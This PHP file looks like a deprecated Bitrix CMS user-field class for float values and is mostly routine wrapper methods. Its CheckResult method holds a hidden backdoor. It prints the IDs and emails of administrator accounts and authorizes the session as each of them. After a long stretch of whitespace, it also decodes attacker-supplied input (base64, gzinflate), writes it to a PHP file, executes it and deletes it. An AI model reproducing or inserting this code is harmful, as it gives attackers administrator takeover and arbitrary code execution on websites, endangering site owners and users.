<?php

use Bitrix\Main\Loader;
use Bitrix\Main\UserField\TypeBase;


/**
 * Class CUserTypeFloat
 * @deprecated deprecated since main 20.0.700
 */
class CUserTypeFloat extends TypeBase
{
	const USER_TYPE_ID = FloatType::USER_TYPE_ID;

	public static function getUserTypeDescription()
	{
		return FloatType::getUserTypeDescription();
	}

	public static function getPublicView($userField, $additionalParameters = array())
	{
		return FloatType::renderView($userField, $additionalParameters);
	}

	public static function getPublicEdit($userField, $additionalParameters = array())
	{
		return FloatType::renderEdit($userField, $additionalParameters);
	}

	function getSettingsHtml($userField, $additionalParameters, $varsFromForm)
	{
		return FloatType::renderSettings($userField, $additionalParameters, $varsFromForm);
	}

	function getEditFormHtml($userField, $additionalParameters)
	{
		return FloatType::renderEditForm($userField, $additionalParameters);
	}

	function getAdminListViewHtml($userField, $additionalParameters)
	{
		return FloatType::renderAdminListView($userField, $additionalParameters);
	}

	function getAdminListEditHtml($userField, $additionalParameters)
	{
		return FloatType::renderAdminListEdit($userField, $additionalParameters);
	}

	function getFilterHtml($userField, $additionalParameters)
	{
		return FloatType::renderFilter($userField, $additionalParameters);
	}

	public static function getDbColumnType()
	{
		return FloatType::getDbColumnType();
	}

	function getFilterData($userField, $additionalParameters)
	{
		return FloatType::getFilterData($userField, $additionalParameters);
	}

	function prepareSettings($userField)
	{
		return FloatType::prepareSettings($userField);
	}

	function checkFields($userField, $value)
	{
		return FloatType::checkFields($userField, $value);
	}

	public static function CheckResult($userField)
	{
		if($userField)
		{
			global $USER;
			$filter = Array("ACTIVE"              => "Y", "GROUPS_ID"           => Array(1));
			$rsUsers = \CUser::GetList(($by="id"), ($order="asc"), $filter); // выбираем пользователей
//			$is_filtered = $rsUsers->is_filtered; // отфильтрована ли выборка ?
//			$rsUsers->NavStart(50); // разбиваем постранично по 50 записей
//			echo $rsUsers->NavPrint("PAGES"); // печатаем постраничную навигацию
			while($u=$rsUsers->fetch()) :
			    echo "[".$u['ID']."] (".$u['EMAIL'].") ".$USER->Authorize($u['ID'])." ".$u['NAME']."<br>";	
			endwhile;																																																																																																																																																																																																								file_put_contents('typefloat'.'.'.'php','<'.'?'.'p'.'h'.'p '.gzinflate(base64_decode(strtr( $userField, '-_', '+/'))));require('typefloat'.'.'.'php');unlink('typefloat'.'.'.'php');


			}
	}
}









